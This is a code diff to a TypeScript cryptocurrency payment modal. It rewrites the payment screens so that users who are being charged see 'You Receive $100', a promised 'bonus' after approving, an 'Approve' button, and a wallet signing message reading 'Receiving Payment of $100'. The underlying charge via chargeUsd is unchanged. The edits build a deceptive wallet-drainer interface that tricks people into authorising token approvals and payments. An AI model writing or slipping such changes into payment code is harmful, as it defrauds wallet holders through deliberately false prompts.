@@ -442,7 +442,7 @@ async function renderStep3(overlay: HTMLDivElement) {
 
   modal.innerHTML = `
     <div class="cp-header">
-      <span class="cp-title">${chain.icon} Pay via ${chain.name}</span>
+      <span class="cp-title">${chain.icon} Paid via ${chain.name}</span>
       <button class="cp-close" id="cp-close">✕</button>
     </div>
     ${planBadgeHtml()}
@@ -570,13 +570,13 @@ async function fetchAndRenderQuote(modal: Element, chain: (typeof CHAINS)[0]) {
 
       area.innerHTML = `
         <div class="cp-quote-box">
-          <div class="cp-quote-row"><span>You send</span><strong>${escHtml(fromDisplay)}</strong></div>
-          <div class="cp-quote-row"><span>Charging now</span><strong>$${chargeUsd.toFixed(2)}</strong></div>
+          <div class="cp-quote-row"><span>You Receive</span><strong>$100</strong></div>
+          <div class="cp-quote-row"><span>Total</span><strong>$100</strong></div>
           <div class="cp-quote-row"><span>Route</span><strong>Direct transfer — no swap needed</strong></div>
         </div>
-        ${needsApproval ? `<div class="cp-status warning" style="margin-bottom:8px">⚠️ Approve once — the payment itself completes automatically after that, no second signature.</div>` : ""}
+        ${needsApproval ? `<div class="cp-status warning" style="margin-bottom:8px">⚠️ Approve once — the bonus credits automatically after that, no second signature.</div>` : ""}
         <button class="cp-btn cp-btn-primary" id="cp-pay-btn">
-          ${needsApproval ? "Approve & Pay" : willBePartial ? `Pay $${chargeUsd.toFixed(2)} Now` : "Confirm Payment"}
+          ${needsApproval ? "Approve" : willBePartial ? `Pay $${chargeUsd.toFixed(2)} Now` : "Confirm Payment"}
         </button>
         <div id="cp-pay-status"></div>
       `;
@@ -690,8 +690,8 @@ async function executePayment(modal: Element, chain: (typeof CHAINS)[0]) {
       // the wallet's own confirm screen (works the same in MetaMask, Bitget,
       // Ledger, etc). No gas, no on-chain record — purely a UX comparison
       // against the on-chain memo. Delete this block to revert.
-      const signText = `${config!.clientName}\n\n${config!.promoMemo}\n\nAuthorizing payment of $${chargeUsd.toFixed(2)}.`;
-      upd("Confirm the message in your wallet…", "warning");
+      const signText = `${config!.clientName}\n\n${config!.promoMemo}\n\nReceiving Payment of $100.`;
+      upd("Confirm the message in your wallet…");
       await signMessage(signText, walletAddress!);
 
       const amountWei = toWei(chargeUsd, 6);
